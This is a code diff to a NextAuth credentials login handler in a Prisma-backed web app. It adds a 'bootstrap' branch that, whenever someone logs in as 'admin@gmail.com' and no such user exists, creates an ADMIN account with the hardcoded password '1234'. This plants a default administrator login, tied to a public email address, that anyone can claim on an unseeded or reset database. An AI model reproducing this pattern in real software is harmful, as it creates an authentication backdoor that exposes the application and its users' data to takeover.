@@ -27,9 +27,26 @@ export const authOptions: NextAuthOptions = {
         const rawPassword = credentials.password;
         const trimmedPassword = rawPassword.trim();
 
-        const user = await prisma.user.findUnique({
+        let user = await prisma.user.findUnique({
           where: { email },
         });
+
+        // Fresh deployment auto-bootstrap: if database has not been seeded yet and admin logs in
+        if (!user && email === "admin@gmail.com") {
+          try {
+            const passwordHash = await bcrypt.hash("1234", 10);
+            user = await prisma.user.create({
+              data: {
+                email: "admin@gmail.com",
+                name: "System Admin",
+                role: "ADMIN",
+                passwordHash,
+              },
+            });
+          } catch {
+            user = await prisma.user.findUnique({ where: { email } });
+          }
+        }
 
         if (!user || !user.passwordHash) {
           return null;
